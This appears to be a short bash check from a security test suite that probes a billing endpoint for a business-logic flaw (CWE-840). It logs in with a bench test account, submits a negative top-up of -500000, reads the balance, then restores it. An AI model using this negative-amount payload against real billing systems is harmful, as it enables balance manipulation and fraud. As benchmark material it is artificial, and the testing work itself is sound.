#!/usr/bin/env bash
# BILLING-001 (CWE-840): a negative top-up amount is accepted and drives the
# balance below zero. Self-restoring (adds the amount back).
set -eu
. "$(dirname "$0")/_lib.sh"
login user1@bench.local User123!
post /billing/topup -d "amount=-500000" >/dev/null
bal=$(curl -s -b "$JAR" "$TARGET/billing" | jget balance_cents)
# restore the balance so later runs start clean
post /billing/topup -d "amount=500000" >/dev/null
case "$bal" in
  -*) exit 0 ;;   # negative balance => vulnerable
  *)  exit 1 ;;
esac
